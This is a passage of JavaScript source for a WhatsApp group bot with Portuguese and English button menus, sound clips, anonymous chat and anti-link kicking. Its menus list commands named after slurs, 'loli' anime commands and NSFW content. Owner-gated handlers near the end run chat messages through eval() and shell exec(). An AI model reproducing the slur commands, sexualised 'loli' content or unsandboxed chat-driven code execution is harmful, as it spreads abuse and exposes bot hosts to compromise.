var unicorn = await getBuffer(picak+'Search Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `    「 𝘗𝘦𝘴𝘲𝘶𝘪𝘴𝘢𝘴 」
╔────────
║〆 ${prefix}play [titulo]
║〆 ${prefix}song [texto]
║〆 ${prefix}acharmsc
║〆 ${prefix}yts [texto]
║〆 ${prefix}lyrics [texto]
║〆 ${prefix}google [texto]
║〆 ${prefix}gimage [texto]
║〆 ${prefix}pinterest [texto]
║〆 ${prefix}image [texto]
║〆 ${prefix}film [texto]
║〆 ${prefix}wallpaper [texto]
║〆 ${prefix}searchgc [texto]
║〆 ${prefix}happymod [texto]
║〆 ${prefix}servermc
║〆 ${prefix}mcpedl [texto]
║〆 ${prefix}tvsearch [texto]
║〆 ${prefix}wikimedia [texto]
║〆 ${prefix}ytsearch [texto]
║〆 ${prefix}ringtone [texto]
║〆 ${prefix}wattpad [texto]
║〆 ${prefix}mcserver [ip|port]
╚─────────────────⊀`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'convertmenu':{
var unicorn = await getBuffer(picak+'Convert Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `    「 𝘌𝘥𝘪𝘤𝘰𝘦𝘴 」
╔────────
║〆 ${prefix}toimage [reply stick]
║〆 ${prefix}sticker [reply img|gif]
║〆 ${prefix}take [reply img|gif|stik]
║〆 ${prefix}smeme [reply img]
║〆 ${prefix}emoji [emoji]
║〆 ${prefix}tovideo [reply img]
║〆 ${prefix}togif [reply stick]
║〆 ${prefix}tourl [reply img]
║〆 ${prefix}tovn [reply aud]
║〆 ${prefix}tomp3 [reply vn]
║〆 ${prefix}toaudio [reply vid]
║〆 ${prefix}ebinary [reply txt]
║〆 ${prefix}dbinary [reply txt]
║〆 ${prefix}tinyurl [link]
║〆 ${prefix}styletext [text]
║〆 ${prefix}volume [reply aud]
║〆 ${prefix}bass [reply aud]
║〆 ${prefix}blown [reply aud]
║〆 ${prefix}deep [reply aud]
║〆 ${prefix}earrape [reply aud]
║〆 ${prefix}fast [reply aud]
║〆 ${prefix}fat [reply aud]
║〆 ${prefix}nightcore [reply aud]
║〆 ${prefix}reverse [reply aud]
║〆 ${prefix}robot [reply aud]
║〆 ${prefix}slow [reply aud]
║〆 ${prefix}squirrel [reply aud]
╚─────────────────⊀`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'randomimagemenu':{
var unicorn = await getBuffer(picak+'Random Image Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 RANDOM IMG 」	❖════╗
║〆 ${prefix}coffee
║〆 ${prefix}woof
║〆 ${prefix}meow
║〆 ${prefix}lizard
║〆 ${prefix}wallneon
║〆 ${prefix}wallpubg
║〆 ${prefix}wallml
║〆 ${prefix}wallrandom
║〆 ${prefix}wallcode
║〆 ${prefix}animewall [query]
║〆 ${prefix}animewall2 [query]
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
           case 'emotemenu':{
var unicorn = await getBuffer(picak+'Emote Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 EMOTE 」❖════╗
║〆 ${prefix}instagramemoji
║〆 ${prefix}facebookemoji
║〆 ${prefix}iphoneemoji
║〆 ${prefix}samsungemoji
║〆 ${prefix}joyemoji
║〆 ${prefix}skypeemoji
║〆 ${prefix}twitteremoji
║〆 ${prefix}whatsappemoji
║〆 ${prefix}microsoftemoji
║〆 ${prefix}googleemoji
║〆 ${prefix}pediaemoji
║〆 ${prefix}microsoftemoji
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'imageeffectmenu':{
var unicorn = await getBuffer(picak+'Image Effect Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═════✪「 IMG EFFECT 」	❖════╗
║〆 ${prefix}wanted [reply img]
║〆 ${prefix}triggeredwebp [reply img]
║〆 ${prefix}removebg [reply img]
║〆 ${prefix}upscaler [reply img]
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'animemenu':{
var unicorn = await getBuffer(picak+'Anime Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 ANIME 」❖════╗
║〆 ${prefix}asuna
║〆 ${prefix}anna
║〆 ${prefix}chitoge
║〆 ${prefix}cosplay
║〆 ${prefix}elaina
║〆 ${prefix}emilia
║〆 ${prefix}gremory
║〆 ${prefix}kaguya
║〆 ${prefix}kotori
║〆 ${prefix}kurumi
║〆 ${prefix}mikasa
║〆 ${prefix}rize
║〆 ${prefix}naruto
║〆 ${prefix}yaoi
║〆 ${prefix}animeneko
║〆 ${prefix}waifu
║〆 ${prefix}shinobu
║〆 ${prefix}animeawoo
║〆 ${prefix}animewaifu
║〆 ${prefix}foxgirl
║〆 ${prefix}animenom
║〆 ${prefix}goose
║〆 ${prefix}8ball
║〆 ${prefix}avatar
║〆 ${prefix}tickle
║〆 ${prefix}gecg
║〆 ${prefix}feed
║〆 ${prefix}animeslap
║〆 ${prefix}animepat
║〆 ${prefix}animeneko
║〆 ${prefix}animekiss
║〆 ${prefix}animewlp
║〆 ${prefix}animecuddle
║〆 ${prefix}animecry
║〆 ${prefix}animekill
║〆 ${prefix}animelick
║〆 ${prefix}animebite
║〆 ${prefix}animeyeet
║〆 ${prefix}animebully
║〆 ${prefix}animebonk
║〆 ${prefix}animewink
║〆 ${prefix}animepoke
║〆 ${prefix}animesmile
║〆 ${prefix}animewave
║〆 ${prefix}animeawoo
║〆 ${prefix}animeblush
║〆 ${prefix}animesmug
║〆 ${prefix}animeglomp
║〆 ${prefix}animehappy
║〆 ${prefix}animedance
║〆 ${prefix}animecringe
║〆 ${prefix}animehighfive
║〆 ${prefix}animehandhold
║〆 ${prefix}animemegumin
║〆 ${prefix}animemegumin
║〆 ${prefix}animesmug
║〆 ${prefix}loli-waifu
║〆 ${prefix}couplepp
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'stickermenu':{
var unicorn = await getBuffer(picak+'Sticker Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 STICKER 」❖════╗
║〆 ${prefix}patrick
║〆 ${prefix}emoji
║〆 ${prefix}emojimix
║〆 ${prefix}attp
║〆 ${prefix}ttp
║〆 ${prefix}doge
║〆 ${prefix}lovesticker
║〆 ${prefix}animestick
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'animestickermenu':{
var unicorn = await getBuffer(picak+'Anime Sticker Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 ANIME STICKER 」❖════╗
║〆 ${prefix}loli
║〆 ${prefix}bully
║〆 ${prefix}cuddle
║〆 ${prefix}cry
║〆 ${prefix}hug
║〆 ${prefix}awoo
║〆 ${prefix}kiss
║〆 ${prefix}lick
║〆 ${prefix}pat
║〆 ${prefix}smug
║〆 ${prefix}bonk
║〆 ${prefix}yeet
║〆 ${prefix}blush
║〆 ${prefix}smile
║〆 ${prefix}wave
║〆 ${prefix}highfive
║〆 ${prefix}handhold
║〆 ${prefix}nom
║〆 ${prefix}glomp
║〆 ${prefix}bite
║〆 ${prefix}slap
║〆 ${prefix}kill
║〆 ${prefix}happy
║〆 ${prefix}wink
║〆 ${prefix}poke
║〆 ${prefix}dance
║〆 ${prefix}cringe
║〆 ${prefix}neko
║〆 ${prefix}gura
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'nsfwmenu':{
var unicorn = await getBuffer(picak+'Nsfw Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 NSFW 」❖════╗
║〆 ${prefix}hentaivideo
║〆 ${prefix}hneko
║〆 ${prefix}nwaifu
║〆 ${prefix}animespank
║〆 ${prefix}trap
║〆 ${prefix}gasm
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'funmenu':{
var unicorn = await getBuffer(picak+'Fun Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 Fun 」❖════╗
║〆 ${prefix}how [text
║〆 ${prefix}when [text]
║〆 ${prefix}where [text]
║〆 ${prefix}is [text]
║〆 ${prefix}what [text]
║〆 ${prefix}can [text]
║〆 ${prefix}rate [text]
║〆 ${prefix}beautifulcheck [tag]
║〆 ${prefix}awesomecheck [tag]
║〆 ${prefix}prettycheck [tag]
║〆 ${prefix}lesbiancheck [tag]
║〆 ${prefix}gaycheck [tag]
║〆 ${prefix}cutecheck [tag]
║〆 ${prefix}uglycheck [tag]
║〆 ${prefix}hornycheck [tag]
║〆 ${prefix}charactercheck [tag]
║〆 ${prefix}lovelycheck [tag]
║〆 ${prefix}couple
║〆 ${prefix}mysoulmate
║〆 ${prefix}hot
║〆 ${prefix}sexy
║〆 ${prefix}kind
║〆 ${prefix}idiot
║〆 ${prefix}handsome
║〆 ${prefix}beautiful
║〆 ${prefix}cute
║〆 ${prefix}pretty
║〆 ${prefix}lesbian
║〆 ${prefix}noob
║〆 ${prefix}bastard
║〆 ${prefix}foolish
║〆 ${prefix}nerd
║〆 ${prefix}asshole
║〆 ${prefix}gay
║〆 ${prefix}smart
║〆 ${prefix}stubble
║〆 ${prefix}dog
║〆 ${prefix}horny
║〆 ${prefix}cunt
║〆 ${prefix}wibu
║〆 ${prefix}noobra
║〆 ${prefix}nibba
║〆 ${prefix}nibbi
║〆 ${prefix}comrade
║〆 ${prefix}mumu
║〆 ${prefix}rascal
║〆 ${prefix}scumbag
║〆 ${prefix}nuts
║〆 ${prefix}fagot
║〆 ${prefix}scoundrel
║〆 ${prefix}ditch
║〆 ${prefix}dope
║〆 ${prefix}gucci
║〆 ${prefix}lit
║〆 ${prefix}dumbass
║〆 ${prefix}crackhead
║〆 ${prefix}mf
║〆 ${prefix}motherfucker
║〆 ${prefix}sucker
║〆 ${prefix}fuckboy
║〆 ${prefix}playboy
║〆 ${prefix}fuckgirl
║〆 ${prefix}playgirl
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'soundmenu':{
var unicorn = await getBuffer(picak+'Sound Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 Sound 」	
║〆 ${prefix}sound1
║〆 ${prefix}sound2
║〆 ${prefix}sound3
║〆 ${prefix}sound4
║〆 ${prefix}sound5
║〆 ${prefix}sound6
║〆 ${prefix}sound7
║〆 ${prefix}sound8
║〆 ${prefix}sound9
║〆 ${prefix}sound10
║〆 ${prefix}sound11
║〆 ${prefix}sound12
║〆 ${prefix}sound13
║〆 ${prefix}sound14
║〆 ${prefix}sound15
║〆 ${prefix}sound16
║〆 ${prefix}sound17
║〆 ${prefix}sound18
║〆 ${prefix}sound19
║〆 ${prefix}sound20
║〆 ${prefix}sound21
║〆 ${prefix}sound22
║〆 ${prefix}sound23
║〆 ${prefix}sound24
║〆 ${prefix}sound25
║〆 ${prefix}sound26
║〆 ${prefix}sound27
║〆 ${prefix}sound28
║〆 ${prefix}sound29
║〆 ${prefix}sound30
║〆 ${prefix}sound31
║〆 ${prefix}sound32
║〆 ${prefix}sound33
║〆 ${prefix}sound34
║〆 ${prefix}sound35
║〆 ${prefix}sound36
║〆 ${prefix}sound37
║〆 ${prefix}sound38
║〆 ${prefix}sound39
║〆 ${prefix}sound40
║〆 ${prefix}sound41
║〆 ${prefix}sound42
║〆 ${prefix}sound43
║〆 ${prefix}sound44
║〆 ${prefix}sound45
║〆 ${prefix}sound46
║〆 ${prefix}sound47
║〆 ${prefix}sound48
║〆 ${prefix}sound49
║〆 ${prefix}sound50
║〆 ${prefix}sound51
║〆 ${prefix}sound52
║〆 ${prefix}sound53
║〆 ${prefix}sound54
║〆 ${prefix}sound55
║〆 ${prefix}sound56
║〆 ${prefix}sound57
║〆 ${prefix}sound58
║〆 ${prefix}sound59
║〆 ${prefix}sound60
║〆 ${prefix}sound61
║〆 ${prefix}sound62
║〆 ${prefix}sound63
║〆 ${prefix}sound64
║〆 ${prefix}sound65
║〆 ${prefix}sound66
║〆 ${prefix}sound67
║〆 ${prefix}sound68
║〆 ${prefix}sound69
║〆 ${prefix}sound70
║〆 ${prefix}sound71
║〆 ${prefix}sound72
║〆 ${prefix}sound73
║〆 ${prefix}sound74
║〆 ${prefix}sound75
║〆 ${prefix}sound76
║〆 ${prefix}sound77
║〆 ${prefix}sound78
║〆 ${prefix}sound79
║〆 ${prefix}sound80
║〆 ${prefix}sound81
║〆 ${prefix}sound82
║〆 ${prefix}sound83
║〆 ${prefix}sound84
║〆 ${prefix}sound85
║〆 ${prefix}sound86
║〆 ${prefix}sound87
║〆 ${prefix}sound88
║〆 ${prefix}sound89
║〆 ${prefix}sound90
║〆 ${prefix}sound91
║〆 ${prefix}sound92
║〆 ${prefix}sound93
║〆 ${prefix}sound94
║〆 ${prefix}sound95
║〆 ${prefix}sound96
║〆 ${prefix}sound97
║〆 ${prefix}sound98
║〆 ${prefix}sound99
║〆 ${prefix}sound100
║〆 ${prefix}sound101
║〆 ${prefix}sound102
║〆 ${prefix}sound103
║〆 ${prefix}sound104
║〆 ${prefix}sound105
║〆 ${prefix}sound106
║〆 ${prefix}sound107
║〆 ${prefix}sound108
║〆 ${prefix}sound109
║〆 ${prefix}sound110
║〆 ${prefix}sound111
║〆 ${prefix}sound112
║〆 ${prefix}sound113
║〆 ${prefix}sound114
║〆 ${prefix}sound115
║〆 ${prefix}sound116
║〆 ${prefix}sound117
║〆 ${prefix}sound118
║〆 ${prefix}sound119
║〆 ${prefix}sound120
║〆 ${prefix}sound121
║〆 ${prefix}sound122
║〆 ${prefix}sound123
║〆 ${prefix}sound124
║〆 ${prefix}sound125
║〆 ${prefix}sound126
║〆 ${prefix}sound127
║〆 ${prefix}sound128
║〆 ${prefix}sound129
║〆 ${prefix}sound130
║〆 ${prefix}sound131
║〆 ${prefix}sound132
║〆 ${prefix}sound133
║〆 ${prefix}sound134
║〆 ${prefix}sound135
║〆 ${prefix}sound136
║〆 ${prefix}sound137
║〆 ${prefix}sound138
║〆 ${prefix}sound139
║〆 ${prefix}sound140
║〆 ${prefix}sound141
║〆 ${prefix}sound142
║〆 ${prefix}sound143
║〆 ${prefix}sound144
║〆 ${prefix}sound145
║〆 ${prefix}sound146
║〆 ${prefix}sound147
║〆 ${prefix}sound148
║〆 ${prefix}sound149
║〆 ${prefix}sound150
║〆 ${prefix}sound151
║〆 ${prefix}sound152
║〆 ${prefix}sound153
║〆 ${prefix}sound154
║〆 ${prefix}sound155
║〆 ${prefix}sound156
║〆 ${prefix}sound157
║〆 ${prefix}sound158
║〆 ${prefix}sound159
║〆 ${prefix}sound160
║〆 ${prefix}sound161
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'gamemenu': case'jogos':{
var unicorn = await getBuffer(picak+'Game Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 JOGOS 」	
║〆 ${prefix}akinator
║〆 ${prefix}perfil
║〆 ${prefix}truth
║〆 ${prefix}dare
║〆 ${prefix}tictactoe
║〆 ${prefix}delttt
║〆 ${prefix}guess [option]
║〆 ${prefix}math [mode]
║〆 ${prefix}suitpvp [tag]
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'anonymousmenu':{
var unicorn = await getBuffer(picak+'Anonymous Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪「 ANONYMOUS 」	
║〆 ${prefix}anonymous
║〆 ${prefix}start
║〆 ${prefix}next
║〆 ${prefix}leave
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'databasemenu':{
var unicorn = await getBuffer(picak+'Database Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪「 DATABASE 」	❖════╗
║〆 ${prefix}setcmd
║〆 ${prefix}listcmd
║〆 ${prefix}delcmd
║〆 ${prefix}lockcmd
║〆 ${prefix}addmsg
║〆 ${prefix}listmsg
║〆 ${prefix}getmsg
║〆 ${prefix}delmsg
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'othermenu':{
var unicorn = await getBuffer(picak+'Other Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═❖「 OTHER 」❖════╗
║〆 ${prefix}afk
║〆 ${prefix}id
║〆 ${prefix}toqr [link]
║〆 ${prefix}repeat
║〆 ${prefix}readmore [text]
║〆 ${prefix}toviewonce
║〆 ${prefix}fliptext [text]] 
║〆 ${prefix}alive
║〆 ${prefix}script
║〆 ${prefix}speedtest
║〆 ${prefix}ping
║〆 ${prefix}owner
║〆 ${prefix}menu
║〆 ${prefix}delete
║〆 ${prefix}chatinfo
║〆 ${prefix}quoted
║〆 ${prefix}listpc
║〆 ${prefix}listgc
║〆 ${prefix}donasi
║〆 ${prefix}request
║〆 ${prefix}report [bug]
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
x_tiktok = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await client.sendMessage(m.chat, { audio: x_tiktok, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
            default:
if (budy.startsWith('=>')) {
  if (!isCreator) return m.reply(mess.owner)
  function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
    if (sat == undefined) {
        bang = util.format(sul)
    }
    return m.reply(bang)
  }
  try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
  } catch (e) {
m.reply(String(e))
  }
}

if (budy.startsWith('>')) {
  if (!isCreator) return m.reply(mess.owner)
  try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
  } catch (err) {
await m.reply(String(err))
  }
}

if (budy.startsWith('$')) {
  if (!isCreator) return m.reply(mess.owner)
  exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
  })
}
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
  this.anonymous = this.anonymous ? this.anonymous : {}
  let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
  if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
    contextInfo: {
        ...m.msg.contextInfo,
        forwardingScore: 0,
        isForwarded: true,
        participant: other
    }
} : {})
  }
  return !0
}
   
//proteção aaaaaa
if(isUrl(body) && isAntiLinkHard && isAdmins && isBotAdmins) {
    linkgpp = await client.groupInviteCode(from)
    if(!isUrl(body)) return 
    if(budy.match(`${linkgpp}`)) return 
    if(isBot) return //reply('sorte q vc é adm, patrão')
}
    
    if(isUrl(body) && isAntiLinkHard && !isAdmins && isBotAdmins) {
    linkgpp = await client.groupInviteCode(from)
    if(budy.match(`${linkgpp}`)) return //reply('Link desse grupo pode 🤸')  
    if(!isUrl(body)) return //reply('Vish, olha o ban')
    client.groupParticipantsUpdate(m.chat, [sender], 'remove')
    //client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.sender.id, participant: m.sender } })
}
    
    if(m.isGroup && isAntiLinkHard) {
    if(m.key.fromMe) return 
    linkgppp = await client.groupInviteCode(from)  
    if(!budy.match(linkgppp) && budy.includes("chat.whatsapp.com/")) {
    if(budy.match(linkgppp)) return //reply ('Link desse grupo pode 🚴') 
    if(m.key.fromMe) return 
    if(isAdmins || isCreator) return //reply('adm pode bb.')
    //reply('pega o ban')
    client.groupParticipantsUpdate(m.chat, [sender], 'remove')  }
    //client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.key.id, participant: m.sender } })
}
    		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    client.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        client.sendMessage(m.chat, { react: { text: "❌", key: m.key }})
        console.log(err)
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})